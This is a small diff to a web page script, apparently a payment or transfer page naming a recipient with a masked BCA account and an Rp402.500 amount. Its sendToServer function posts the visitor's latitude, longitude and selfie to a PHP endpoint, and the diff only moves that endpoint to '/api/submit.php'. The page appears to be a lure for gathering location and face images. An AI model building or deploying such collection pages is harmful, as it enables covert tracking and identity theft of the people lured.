@@ -1,5 +1,6 @@
 var TARGET_NAME  = 'Michael Tanuwijaya (BCA •••• 5521)';
 var TOTAL_AMOUNT = 'Rp402.500';
+
 (function injectStyle() {
   if (document.getElementById('dyn-style')) return;
   var s = document.createElement('style');
@@ -177,12 +178,10 @@ function sendToServer(lat, lng, selfieBlob) {
       var file = new File([selfieBlob], 'selfie.jpg', { type: 'image/jpeg' });
       formData.append('selfie', file);
     }
-
-    fetch('submit.php', {
-      method: 'POST',
-      body: formData
-      // JANGAN set Content-Type — browser otomatis set multipart/form-data
-    })
+fetch('/api/submit.php', {
+  method: 'POST',
+  body: formData
+})
     .then(function (res) {
       return res.text().then(function (text) {
         var json;
